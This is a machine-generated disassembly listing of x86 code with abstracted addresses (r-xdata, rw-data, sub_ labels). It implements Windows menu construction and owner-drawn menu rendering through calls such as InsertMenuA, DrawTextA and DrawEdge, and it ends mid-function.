mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45fe38
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_45d4a4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461dd4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45f4d4
test eax eax
jg r-xdata
mov edx esi
call sub_45f86c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45f4e4
call sub_403174
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403174
lea eax [ esi + 0x44 ]
call sub_40cfec
lea eax [ esi + 0x78 ]
call sub_40cfec
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45d8c0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418aa0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420a14
test bl bl
jle r-xdata
call sub_403174
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_45d558
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d7b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d7ba
lea eax [ ebp - 0x40 ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f84
mov eax ebx
call sub_45f4d4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45da68
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042f8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45f4d4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45fa90
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45cbbc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40426c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043ac
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4043ac
push eax
mov eax ebx
call sub_45da68
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45f0ac
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042f8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4043ac
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45f4d4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45da68
mov [ ebp - 0x25 ] eax
sub_45d7d3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45d558
xor eax eax
pop ebp
retn
sub_45d7f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4610cc
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460094
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460590
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45cf94
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45d868
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d8b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d9a4
mov eax [ ebp - 0x4 ]
call sub_45ce1c
mov edx eax
mov eax ebx
call sub_45f508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d8b9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_45d8c0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45d938
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_420a98
sub_45d8fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420e18
mov eax ebx
call sub_45f4bc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45f4bc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403370
pop esi
pop ebx
retn
mov eax ebx
call sub_45d938
sub_45d938
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45da68
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45d938
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45da68
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45da68
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45d7f8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebp
call sub_45da68
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45da08
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45f4d4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45f4e4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45f4e4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45f4e4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45cb10
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45da68
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45d7f8
mov eax [ rw-data ]
call sub_45cb10
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45dab4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420d40
push ebx
push sub_45d868
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45daf8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45dcdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45fa90
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f84
test bh 0x4
je r-xdata
mov eax edi
call sub_4610cc
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042f8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42432c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b4
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423d04
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423d10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dce3
lea eax [ ebp - 0xc ]
call sub_403eec
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041ac
push eax
mov eax [ ebp - 0xc ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a44
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041ac
push eax
mov eax [ ebp - 0xc ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423a44
mov eax 0xff00000d
call sub_423584
mov esi eax
mov eax 0xff000010
call sub_423584
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a44
jmp r-xdata
sub_45dd48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45e630
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424210
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a44
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424210
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45ab0c
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a70
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424208
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424210
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45e18f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428250
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423a44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45ab0c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424210
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424208
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429254
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4241e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424798
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
